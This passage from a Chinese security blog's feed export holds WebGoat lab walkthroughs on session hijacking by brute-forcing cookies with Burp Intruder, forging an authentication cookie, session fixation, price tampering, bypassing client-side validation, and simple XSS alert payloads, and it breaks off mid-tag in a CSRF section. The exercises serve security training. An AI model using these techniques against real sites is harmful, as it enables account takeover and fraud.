alt=&quot;8&quot;&gt;&lt;br&gt;上图可以看到这是我们抓到的所有token，都是连续的，但是只有16964和16966之间却缺少了16965，因此我们猜测这个token是一个已经登录进去的会话，我们可以利用这个会话进行登录。现在我们需要猜测减号后面的那部分数据，它是在1462418466736到1462418466754之间的，下面使用暴力破解，我们将请求继续发送到Intruder，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/9.png&quot; alt=&quot;9&quot;&gt;&lt;br&gt;给cookie的最后两位数增加变量，然后给该变量设置范围，burpsuit会根据你设定的范围一个个的去试，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/10.png&quot; alt=&quot;10&quot;&gt;&lt;br&gt;上面对相关变量的一些设置。然后点击Stack Attack。&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/11.png&quot; alt=&quot;11&quot;&gt;&lt;br&gt;可以看到有一条记录服务器响应的长度与其他记录不一样，而上图下方显示的是该条记录具体发送的内容和服务器的响应。最后可以看到以该内容作为请求发送时，成功登陆了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/12.png&quot; alt=&quot;12&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Spoof-an-Anthentication-cookie&quot;&gt;&lt;a href=&quot;#Spoof-an-Anthentication-cookie&quot; class=&quot;headerlink&quot; title=&quot;Spoof an Anthentication cookie&quot;&gt;&lt;/a&gt;Spoof an Anthentication cookie&lt;/h2&gt;&lt;p&gt;如下登陆页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/13.png&quot; alt=&quot;13&quot;&gt;&lt;br&gt;我们有两个用户名和密码，分别为：webgoat/webgoat、aspect/aspect，现在我们还知道alice的用户名却不知道其密码，要求我们以alice的身份登陆。&lt;br&gt;我们尝试以webgoat的身份进行登陆，发现登陆时的请求为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/14.png&quot; alt=&quot;14&quot;&gt;&lt;br&gt;服务器端的响应为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/15.png&quot; alt=&quot;15&quot;&gt;&lt;br&gt;可见登陆的时候是没有AuthCookie的，登陆之后服务器传给浏览器一个AuthCookie，我们观察其值。&lt;br&gt;下面以aspect身份进行登陆，看到：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/16.png&quot; alt=&quot;16&quot;&gt;&lt;br&gt;观察如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;webgoat  ——&amp;gt;  65432ubphcfs&lt;br&gt;aspect   ——&amp;gt;  65432udfqtb&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;可以找到规律了，就是把字母反过来，再向后移动一位。&lt;br&gt;那么猜测alice的AuthCookie为：65432fdjmb，在用户名和密码那里什么都不填，直接提交，burpsuit拦截后修改cookie如下：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/17.png&quot; alt=&quot;17&quot;&gt;&lt;br&gt;然后成功登陆:&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/18.png&quot; alt=&quot;18&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Session-Fixation&quot;&gt;&lt;a href=&quot;#Session-Fixation&quot; class=&quot;headerlink&quot; title=&quot;Session Fixation&quot;&gt;&lt;/a&gt;Session Fixation&lt;/h2&gt;&lt;p&gt;通过会话固定盗取Session。服务器通过每个用户唯一的Session ID来确认其合法性。如果用户已登录，并且授权服务器不必重新验证授权后，当该用户需要重新登录进入系统时，他的Session ID 依然被服务器认为是合法的。&lt;br&gt;在一些程序中，可能会在GET-REQUEST请求中传递Session ID。这就是攻击的起点。一个攻击者可以用一个选定的Session ID给受害人发送一个超链接。例如，这里有一个准备好的邮件，它看起来像是一个从应用程序管理员发来的官方邮件。如果受害者点击了这个链接，并且该受害者以攻击者指定的Session ID登录了系统，那么攻击者可以不经授权直接使用与受害者相同的Session ID来访问该页面。&lt;br&gt;在实际课程中需要我们同时扮演攻击者和受害者，攻击者是Hacker，受害者是Jane。&lt;br&gt;首先由Hacker向Jane发一封看起来很正常的邮件，该邮件是关于银行对账单的。需要诱导受害者点击该邮件的链接。该邮件为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/20.png&quot; alt=&quot;20&quot;&gt;&lt;br&gt;邮件中间是一个超链接，对应的代码为：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/19.png&quot; alt=&quot;19&quot;&gt;&lt;br&gt;然后受害者点击了该超链接，进入他的银行系统的登陆页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/21.png&quot; alt=&quot;21&quot;&gt;&lt;br&gt;该页面的链接地址为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://localhost:8443/WebGoat/attack?Screen=16&amp;amp;menu=1700&amp;amp;SID=qimingyu&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://localhost:8443/WebGoat/attack?Screen=16&amp;amp;menu=1700&amp;amp;SID=qimingyu&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;受害者本人要登陆系统，肯定知道自己的账号和密码。于是输入账号：Jane，密码：tarzan，进入系统。受害者进入系统之后，他的sessionID已经通过验证，就是有效的了。这时，黑客也进入该银行系统的登陆页面，此时的地址为：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://localhost:8443/WebGoat/attack?Screen=16&amp;amp;menu=1700&amp;amp;SID=NOVALIDSESSION&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://localhost:8443/WebGoat/attack?Screen=16&amp;amp;menu=1700&amp;amp;SID=NOVALIDSESSION&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将后面的SID修改为qimingyu，无需输入用户名和密码，就可以以受害者Jane的身份登陆该系统了。&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/22.png&quot; alt=&quot;22&quot;&gt;&lt;br&gt;这是一连串精心构造的攻击，其关键漏洞是网站依靠URL来传递SID的值，容易被人截取并修改。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;第一节是通过暴力猜对cookie绕过验证进行登陆。&lt;br&gt;第二节是通过观察猜对cookie绕过验证进行登陆。&lt;br&gt;第三节是诱骗受害者以固定的Session登陆，然后攻击者再通过该Session绕过验证直接登陆。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/04/Webgoat之Session_Management_Flaws/&quot;&gt;http://qimingyu.github.io/2016/05/04/Webgoat之Session_Management_Flaws/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Hijack-a-Session&quot;&gt;&lt;a href=&quot;#Hijack-a-Session&quot; class=&quot;headerlink&quot; title=&quot;Hijack a Session&quot;&gt;&lt;/a&gt;Hijack a Session&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;如图是一个登陆页面，现在要求在不知道用户名和密码的情况下登陆进去。现在我们已经知道的是如果传过去的cookie是对的话，服务器端会跳过验证用户名和密码的环节。也就是说用户名和密码可以随便填写，关键是猜对cookie，并且这个cookie需要是正在使用的会话cookie。我们先随便抓一个看看所提交的是哪些数据：&lt;br&gt;&lt;img src=&quot;/images/webgoat_session_management_flaws/2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="会话管理" scheme="http://qimingyu.github.io/tags/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之Parameter Tampering</title>
    <link href="http://qimingyu.github.io/2016/05/04/Webgoat%E4%B9%8BParameter_Tampering/"/>
    <id>http://qimingyu.github.io/2016/05/04/Webgoat之Parameter_Tampering/</id>
    <published>2016-05-04T07:58:31.000Z</published>
    <updated>2016-05-04T09:54:18.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Exploit-Hidden-Fields&quot;&gt;&lt;a href=&quot;#Exploit-Hidden-Fields&quot; class=&quot;headerlink&quot; title=&quot;Exploit Hidden Fields&quot;&gt;&lt;/a&gt;Exploit Hidden Fields&lt;/h2&gt;&lt;p&gt;这是一个购物篮，我们点击购买，要求购买的价格低于正常价格。&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;用burpsuit拦截之后观察所提交的参数，发现有一项是单价price，因此我们可以修改该price后发送。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Exploit-Unchecked-Email&quot;&gt;&lt;a href=&quot;#Exploit-Unchecked-Email&quot; class=&quot;headerlink&quot; title=&quot;Exploit Unchecked Email&quot;&gt;&lt;/a&gt;Exploit Unchecked Email&lt;/h2&gt;&lt;p&gt;多数网站都允许一个非验证的用户给别人发送电子邮件。如下所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/2.png&quot; alt=&quot;2&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是一个网站的页面。可以看到上面是一个可选项，当输入自己的email用户名和密码时，就是用自己的邮箱去发送评论。当默认时，就是用网站的邮箱发送评论。有两个要求，第一个是发送一封具有XSS攻击的邮件。第二个是修改默认的收件人，使其能够发送给你想发送的人。相当于用第三方网站的邮箱给别人发送恶意邮件，爽滋滋。&lt;/p&gt;
&lt;p&gt;邮件内容为：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt;alert(&lt;span class=&quot;string&quot;&gt;&quot;XSS&quot;&lt;/span&gt;)&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;点发送就完成了第一个要求。然后用burpsuit抓包，修改默认收件人，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/webgoat_xss/3.png&quot; alt=&quot;3&quot;&gt;&lt;/p&gt;
&lt;p&gt;最后点击发送就成功了。&lt;/p&gt;
&lt;h2 id=&quot;Bypass-Client-Side-JS-Validation&quot;&gt;&lt;a href=&quot;#Bypass-Client-Side-JS-Validation&quot; class=&quot;headerlink&quot; title=&quot;Bypass Client Side JS Validation&quot;&gt;&lt;/a&gt;Bypass Client Side JS Validation&lt;/h2&gt;&lt;p&gt;这节讲的是绕过客户端的JS验证。有时我们需要在浏览器中输入一些数据，这些数据一定要符合一定的规则或要求，例如大小写，位数等。而所有这些输入的验证应该同时在客户端和服务器端进行验证才是安全的。单纯的客户端验证不应该被认为是一种安全的方法验证参数。攻击者可以用各种方法轻易的绕过这种机制。任何客户端验证都应该复制到服务器端。这将大大减少不安全的参数在应用程序中使用的可能性。&lt;/p&gt;
&lt;p&gt;这部分内容要求我们绕过客户端的验证机制，破坏这些规则，从而向服务器输入不允许输入的字符。&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/4.png&quot; alt=&quot;4&quot;&gt;&lt;/p&gt;
&lt;p&gt;有两种方案可以做到：&lt;/p&gt;
&lt;h3 id=&quot;方案一&quot;&gt;&lt;a href=&quot;#方案一&quot; class=&quot;headerlink&quot; title=&quot;方案一&quot;&gt;&lt;/a&gt;方案一&lt;/h3&gt;&lt;p&gt;该方案的思路主要是通过中间人修改客户端数据的方式来绕过验证&lt;br&gt;用burpsuit拦截后分别修改，再提交，如下图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/5.png&quot; alt=&quot;5&quot;&gt;&lt;br&gt;这是因为在浏览器的输入是符合规范的，然后点击提交，点击提交的时候，触发了客户端的JS验证输入合法性的函数，函数判断是OK的，之后再发送（如果这里JS判断不OK，是不会进行下一步发送的，burpsuit也就不会拦截到），而发送之后会被burpsuit拦截掉了，然后修改。&lt;/p&gt;
&lt;h3 id=&quot;方案二&quot;&gt;&lt;a href=&quot;#方案二&quot; class=&quot;headerlink&quot; title=&quot;方案二&quot;&gt;&lt;/a&gt;方案二&lt;/h3&gt;&lt;p&gt;该方案的思路主要是修改客户端的代码，使其不能验证，来绕过。&lt;br&gt;我们通过firebug查看submit按钮对应的函数是validate()：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/5.png&quot; alt=&quot;5&quot;&gt;&lt;/p&gt;
&lt;p&gt;该函数的定义是在一段JS脚本中，通过查看页面源代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;SCRIPT&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex1=&lt;span class=&quot;regexp&quot;&gt;/^[a-z]&amp;#123;3&amp;#125;$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex2=&lt;span class=&quot;regexp&quot;&gt;/^[0-9]&amp;#123;3&amp;#125;$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex3=&lt;span class=&quot;regexp&quot;&gt;/^[a-zA-Z0-9 ]*$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex4=&lt;span class=&quot;regexp&quot;&gt;/^(one|two|three|four|five|six|seven|eight|nine)$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex5=&lt;span class=&quot;regexp&quot;&gt;/^\d&amp;#123;5&amp;#125;$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex6=&lt;span class=&quot;regexp&quot;&gt;/^\d&amp;#123;5&amp;#125;(-\d&amp;#123;4&amp;#125;)?$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;regex7=&lt;span class=&quot;regexp&quot;&gt;/^[2-9]\d&amp;#123;2&amp;#125;-?\d&amp;#123;3&amp;#125;-?\d&amp;#123;4&amp;#125;$/&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;validate&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;msg=&lt;span class=&quot;string&quot;&gt;&#39;JavaScript found form errors&#39;&lt;/span&gt;; err=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex1.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field1.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field1&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex2.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field2.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field2&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex3.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field3.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field3&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex4.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field4.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field4&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex5.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field5.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field5&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex6.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field6.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field6&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (!regex7.test(&lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.field7.value)) &amp;#123;err+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; msg+=&lt;span class=&quot;string&quot;&gt;&#39;\n  bad field7&#39;&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ( err &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; ) alert(msg);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;document&lt;/span&gt;.form.submit();&lt;span class=&quot;comment&quot;&gt;//验证完后符合，才发送&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/SCRIPT&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;以上JS代码定义了该按钮的功能，可知如果直接在html中删除如下代码，该按钮就不能运行了。&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;onclick=&lt;span class=&quot;string&quot;&gt;&quot;validate()&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因此需要更细粒度一点。我们在刷新该页面的时候，针对服务器传回来的响应进行拦截之后，将判断验证部分的JS代码全部删掉，这样同样也绕过了客户端的验证。&lt;/p&gt;
&lt;h2 id=&quot;Summarize&quot;&gt;&lt;a href=&quot;#Summarize&quot; class=&quot;headerlink&quot; title=&quot;Summarize&quot;&gt;&lt;/a&gt;Summarize&lt;/h2&gt;&lt;p&gt;关于网络渗透一定要有中间人的意识，数据随时都有可能被中间人修改的。在基础扎实的基础上，思维要开阔。  &lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;【版权声明】&lt;/strong&gt;&lt;br&gt;本文首发于&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰的博客&lt;/a&gt;（ &lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;http://qimingyu.github.io/&lt;/a&gt; ），欢迎转载，但是必须保留本文的署名&lt;a href=&quot;http://qimingyu.github.io/&quot;&gt;戚名钰&lt;/a&gt;（包含链接）。如您有任何商业合作或者授权方面的协商，请给我留言：mingyuqi.java@qq.com&lt;br&gt;本文永久链接：&lt;a href=&quot;http://qimingyu.github.io/2016/05/04/Webgoat之Parameter_Tampering/&quot;&gt;http://qimingyu.github.io/2016/05/04/Webgoat之Parameter_Tampering/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Exploit-Hidden-Fields&quot;&gt;&lt;a href=&quot;#Exploit-Hidden-Fields&quot; class=&quot;headerlink&quot; title=&quot;Exploit Hidden Fields&quot;&gt;&lt;/a&gt;Exploit Hidden Fields&lt;/h2&gt;&lt;p&gt;这是一个购物篮，我们点击购买，要求购买的价格低于正常价格。&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;用burpsuit拦截之后观察所提交的参数，发现有一项是单价price，因此我们可以修改该price后发送。&lt;/p&gt;
    
    </summary>
    
      <category term="应用安全" scheme="http://qimingyu.github.io/categories/%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络渗透" scheme="http://qimingyu.github.io/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
      <category term="WebGoat" scheme="http://qimingyu.github.io/tags/WebGoat/"/>
    
      <category term="参数篡改" scheme="http://qimingyu.github.io/tags/%E5%8F%82%E6%95%B0%E7%AF%A1%E6%94%B9/"/>
    
  </entry>
  
  <entry>
    <title>Webgoat之XSS</title>
    <link href="http://qimingyu.github.io/2016/05/04/Webgoat%E4%B9%8BXSS/"/>
    <id>http://qimingyu.github.io/2016/05/04/Webgoat之XSS/</id>
    <published>2016-05-04T06:37:39.000Z</published>
    <updated>2016-05-10T03:21:33.000Z</updated>
    
    <content type="html">&lt;h2 id=&quot;Phishing-with-XSS&quot;&gt;&lt;a href=&quot;#Phishing-with-XSS&quot; class=&quot;headerlink&quot; title=&quot;Phishing with XSS&quot;&gt;&lt;/a&gt;Phishing with XSS&lt;/h2&gt;&lt;p&gt;如下所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;这是一个标准的输入搜索框，点击搜索之后，会在下方分别呈现要求和搜索结果。&lt;br&gt;要求注入html和js代码，搜集证书，并把其发送给一个网站。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;Stored-XSS-Attacks&quot;&gt;&lt;a href=&quot;#Stored-XSS-Attacks&quot; class=&quot;headerlink&quot; title=&quot;Stored XSS Attacks&quot;&gt;&lt;/a&gt;Stored XSS Attacks&lt;/h2&gt;&lt;p&gt;这节讲存储型的XSS攻击。如图所示：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/7.png&quot; alt=&quot;7&quot;&gt;&lt;br&gt;该页面就像模拟一个贴吧一样。注入代码之后会被存储到后台，然后会被显示出来，浏览器显示的时候会执行该脚本。&lt;/p&gt;
&lt;h2 id=&quot;Reflected-XSS-Attacks&quot;&gt;&lt;a href=&quot;#Reflected-XSS-Attacks&quot; class=&quot;headerlink&quot; title=&quot;Reflected XSS Attacks&quot;&gt;&lt;/a&gt;Reflected XSS Attacks&lt;/h2&gt;&lt;p&gt;这节讲反射型的XSS。就是不经过服务器，直接在浏览器端输入JS脚本后显示出来了。&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/8.png&quot; alt=&quot;8&quot;&gt;&lt;br&gt;如图是购物篮页面，直接在enter your three digit access code添加代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;script&amp;gt; alert(&lt;span class=&quot;string&quot;&gt;&#39;XSS&#39;&lt;/span&gt;) &amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后点击update或purchase，不经过服务器，先在浏览器端显示出来了：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/9.png&quot; alt=&quot;9&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;Cross-Site-Request-Forgery&quot;&gt;&lt;a href=&quot;#Cross-Site-Request-Forgery&quot; class=&quot;headerlink&quot; title=&quot;Cross Site Request Forgery&quot;&gt;&lt;/a&gt;Cross Site Request Forgery&lt;/h2&gt;&lt;p&gt;跨站伪造请求攻击的根本原因是同一个浏览器同时打开两个链接。网页中所有手动发起的请求操作，其实质是通过HTML+JavaScript向服务器发起请求。进入该课程是这样的页面：&lt;br&gt;&lt;img src=&quot;/images/webgoat_xss/4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;我们需要发送一封恶意邮件给新闻组，每当我们发送一封邮件时，对方的Message List就会收到这条消息。我们在邮件中写如下代码：&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;img src=&lt;span 